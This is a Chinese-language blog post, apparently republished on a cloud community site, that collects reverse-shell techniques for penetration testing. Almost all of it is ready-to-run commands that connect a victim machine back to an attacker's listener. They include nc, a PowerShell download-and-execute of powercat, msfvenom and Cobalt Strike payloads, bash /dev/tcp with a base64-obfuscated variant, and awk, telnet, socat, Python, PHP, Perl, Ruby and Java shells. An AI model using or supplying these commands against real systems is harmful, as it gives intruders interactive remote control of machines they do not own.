# 涨姿势！那些反弹shell的技巧总结

发布于 2021-11-25 15:14:22

1.4K0

举报

文章被收录于专栏：网络安全自修室

在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个可交互式shell。

反弹shell是打开内网通道的第一步，也是权限提升过程中至关重要的一步。 

（本文所有姿势整理自实验笔记与网络）

##### 一、Windows反弹shell

###### 0x1 nc反弹

代码语言：javascript

复制

```javascript
nc 192.168.0.1 1234 -e c:\windows\system32\cmd.exe
```

###### 0x2 powershell反弹

(现在较为常用，常用来上线cs) 这里通过利用powercat进行反弹shell，powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多。 1、通过远程下载并直接利用反弹木马或者工具

代码语言：javascript

复制

```javascript
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.0.1 -p 1234 -e cmd
```

2、下载到目标机器后，本地执行：

代码语言：javascript

复制

```javascript
Import-Module ./powercat.ps1
powercat -c 192.168.0.1 -p 1234 -e cmd
```

###### 0x3 通过MSF反弹shell

使用msfvenom生成相关关于powershell反弹的Payload

代码语言：javascript

复制

```javascript
msfvenom -l payloads | grep 'cmd/windows/reverse'
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.0.1 LPORT=1234
```

###### 0x4 通过Cobalt strike反弹shell

1、配置监听器：点击Cobalt Strike——>Listeners——>在下方Tab菜单Listeners，点击add 

2、生成payload：点击Attacks——>Packages——>Windows Executable，保存文件位置 

3、目标机执行远程下载执行powershell payload进行反弹

##### 二、Linux 反弹shell

###### 0x1 bash反弹

代码语言：javascript

复制

```javascript
bash -i >& /dev/tcp/192.168.0.1/1234 0>&1
base64版：bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}'
```

###### 0x2 nc反弹

代码语言：javascript

复制

```javascript
nc -e /bin/bash 192.168.0.1 1234
```

###### 0x3 awk反弹

(输入enter则断开)

代码语言：javascript

复制

```javascript
awk 'BEGIN{s="/inet/tcp/0/192.168.0.1/1234";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

###### 0x4 telnet反弹

(需要在攻击主机上分别监听1234和4321端口，执行反弹shell命令后，在1234终端输入命令，4321查看命令执行后的结果)

代码语言：javascript

复制

```javascript
telnet 192.168.0.1 1234 | /bin/bash | telnet 192.168.0.1 4321
```

###### 0x5 socat反弹

代码语言：javascript

复制

```javascript
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.0.1:1234
```

###### 0x6 Python反弹

代码语言：javascript

复制

```javascript
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.1',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

###### 0x7 PHP反弹

代码语言：javascript

复制

```javascript
php -r '$sock=fsockopen("192.168.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

###### 0x8 Perl反弹

代码语言：javascript

复制

```javascript
perl -e 'use Socket;$i="192.168.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

###### 0x9 Ruby反弹

代码语言：javascript

复制

```javascript
ruby -rsocket -e'f=TCPSocket.open("192.168.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

###### 0x10 JAVA反弹

代码语言：javascript

复制

```javascript
public class Shell {<!-- -->
    /**
    * @param args
    * @throws Exception 
    */
public static void main(String[] args) throws Exception {<!-- -->
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]= {<!-- -->"/bin/bash","-c","exec 5<>/dev/tcp/192.168.0.1/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

保存为Shell.java文件，编译执行反弹shell。

代码语言：javascript

复制

```javascript
javac Shell.java
java Shell
```

本文参与 [腾讯云自媒体同步曝光计划](https://cloud.tencent.com/developer/support-plan)，分享自微信公众号。

原始发表：2021-11-17，如有侵权请联系 [cloudcommunity@tencent.com](mailto:cloudcommunity@tencent.com) 删除